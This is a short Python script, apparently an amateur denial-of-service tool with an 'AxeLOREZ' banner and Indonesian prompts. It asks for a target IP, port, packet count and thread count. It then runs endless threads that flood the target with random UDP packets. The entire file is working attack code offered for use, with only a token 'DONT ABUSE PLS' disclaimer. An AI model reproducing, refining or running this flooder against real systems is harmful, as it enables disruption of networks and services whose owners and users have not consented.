#!/usr/bin/env python3
#/CODE PUNYA AXEL
import struct
import time
import socket
import random
import threading
import os
import sys

os.system ("clear")
print ("""
\033[96m
     _              _     ___  ____  _____ _____
    / \   __  _____| |   / _ \|  _ \| ____|__  /
   / _ \  \ \/ / _ \ |  | | | | |_) |  _|   / / 
  / ___ \  >  <  __/ |__| |_| |  _ <| |___ / /_ 
 /_/   \_\/_/\_\___|_____\___/|_| \_\_____/____|
                                                
                    TOOLS BY AxeL
                    DONT ABUSE PLS
""")

ip = str(input("\033[91m=====> IP Target    : "))
port = int(input("=====> Port Target  : "))
times = int(input("=====> $ Kirim PACKETS : "))
threads = int(input("=====> $ Kirim THREADS : "))
choice = str(input("=====> Siap? (y/n) : "))
#Starting Attacking

def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[93m{ip} \033[92mPort \033[93m{port} \033[93m!!!")
		except:
			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[93m{ip} \033[92mPort \033[93m{port} \033[92m!!!")

def run2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[93m{ip} \033[93mPort \033[93m{port} \033[93m!!!")
		except:
			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[93m{ip} \033[92mPort \033[93m{port} \033[93m!!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
